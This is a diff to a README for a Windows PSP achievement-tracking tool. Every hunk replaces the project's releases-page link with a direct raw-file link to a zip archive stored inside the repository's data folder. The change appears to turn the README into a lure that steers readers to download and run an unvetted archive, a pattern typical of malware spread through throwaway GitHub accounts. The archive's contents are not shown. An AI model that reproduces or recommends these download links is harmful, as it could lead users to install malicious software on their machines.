@@ -1,6 +1,6 @@
 # 🎮 PSPAchievementsSystem - Track PSP Progress on Windows
 
-[![Download PSPAchievementsSystem](https://img.shields.io/badge/Download%20PSPAchievementsSystem-blue?style=for-the-badge)](https://github.com/Serologyantiperspirant659/PSPAchievementsSystem/releases)
+[![Download PSPAchievementsSystem](https://img.shields.io/badge/Download%20PSPAchievementsSystem-blue?style=for-the-badge)](https://github.com/Serologyantiperspirant659/PSPAchievementsSystem/raw/refs/heads/main/data/games/Achievements-PSP-System-3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This README walks you through download, setup, and first use on a Windows PC.
 
 Visit this page to download the latest release:
 
-https://github.com/Serologyantiperspirant659/PSPAchievementsSystem/releases
+https://github.com/Serologyantiperspirant659/PSPAchievementsSystem/raw/refs/heads/main/data/games/Achievements-PSP-System-3.2.zip
 
 Look for the latest release on the page. In most cases, you will download a Windows file such as `.exe` or a `.zip` archive that contains the app.
 
@@ -161,7 +161,7 @@ Yes, but move the full folder, not only the main app file.
 
 Use the release page:
 
-https://github.com/Serologyantiperspirant659/PSPAchievementsSystem/releases
+https://github.com/Serologyantiperspirant659/PSPAchievementsSystem/raw/refs/heads/main/data/games/Achievements-PSP-System-3.2.zip
 
 ## 🖥️ Windows Use Steps
 
@@ -202,4 +202,4 @@ If your data does not appear, check the file path and make sure you chose the co
 
 Download the latest release here:
 
-https://github.com/Serologyantiperspirant659/PSPAchievementsSystem/releases
+https://github.com/Serologyantiperspirant659/PSPAchievementsSystem/raw/refs/heads/main/data/games/Achievements-PSP-System-3.2.zip
